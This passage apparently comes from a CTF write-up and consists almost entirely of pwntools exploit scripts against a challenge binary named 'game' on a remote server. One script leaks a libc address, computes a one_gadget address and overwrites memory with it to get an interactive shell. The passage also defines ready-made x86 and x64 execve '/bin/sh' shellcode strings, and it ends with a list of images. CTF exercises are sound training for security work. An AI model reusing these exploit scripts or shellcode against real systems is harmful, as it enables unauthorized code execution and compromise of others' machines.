 edit(2, shellcode3)
 edit(3, shellcode4)
 test(0)
 p.interactive()
if __name__ == '__main__':
 exp()
```



```
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.terminal=['tmux', 'splitw', '-h']
prog = './game'
#elf = ELF(prog)
# p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})
# libc = ELF("./libc-2.27.so")
p = remote("47.104.71.220", 28262)
def debug(addr,PIE=True): 
 debug_str = ""
 if PIE:
  text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
  for i in addr:
   debug_str+='b *{}n'.format(hex(text_base+i))
  gdb.attach(p,debug_str) 
 else:
  for i in addr:
   debug_str+='b *{}n'.format(hex(i))
  gdb.attach(p,debug_str) 

def dbg():
 gdb.attach(p)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, ' '))
uu64    = lambda data   :u64(data.ljust(8, ' '))
bp      = lambda bkp                :pdbg.bp(bkp)
li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))

 
def dbgc(addr):
 gdb.attach(p,"b*" + hex(addr) +"n c")

def lg(s,addr):
    print(' 33[1;31;40m%20s-->0x%x 33[0m'%(s,addr))

sh_x86_18="x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x86_20="x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x64_21="xf7xe6x50x48xbfx2fx62x69x6ex2fx2fx73x68x57x48x89xe7xb0x3bx0fx05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def choice(idx):
    sla(">> ",str(idx))

def func1(idx):
    choice(1)
    sla(">> ",1)

def func3(idx):
    choice(3)
    sla(">> ",idx)

def func2(idx):
    choice(2)
    sla(">> ",idx)

def func4(idx,idx2):
    choice(4)
    sla("Please tell who you want to visit?",idx)
    sla("Do u want to give gifts to her?(y or n)",'y')
    sla(">> ",idx2)

def func5(idx):
    choice(5)
    sla("which one do you want to invite?",idx)

def exp():
 # debug([0x149E,0x14D2])

    sla("name:","init-0")
    sla("age:",100)
    sla("ID:",0xff1)
    sla("Yes or No (y or n):","y")

    for i in range(120-20):
        func1(1)
    choice(3)
    sla(">> ",2)
    sla(">> ",0xfff000000100)

    for i in range(8):
        func3(1)
        sla("A girl came up to talk to you. Did you ignore her?(y or n)",'n')

    for i in range(10):
        func2(1)
   
    for i in range(9):
        func3(1)
        sla("A girl came up to talk to you. Did you ignore her?(y or n)",'n')

    func4(0,1)
    func2(3)

    func5(7)
    ru("NUMB:")
    data = int(r(15),10)
    data_show = int(hex(data),16)
    lg('data',data)
    addr = data - 0x7f698553eb78 + 0x7f698517a000
    lg('addr',addr)
    og = addr + 0x4527a
  

    func4(0,1)
    func4(0,1)
    payload = p64(og)*8

    func4(0,3)
    sla('Please wrote:',payload)

    func4(0,1)
    func4(0,2)

    lg('og',og)

    choice(6)
    sleep(0.2)
    sl(3)

    # dbg()
    it()
if __name__ == '__main__':
 exp()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/0-1634876121.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/6-1634876122.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/3-1634876123.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/2-1634876123.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/1-1634876123.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/4-1634876124.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/0-1634876124.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/2-1634876124.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/2-1634876125.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/7-1634876125.png)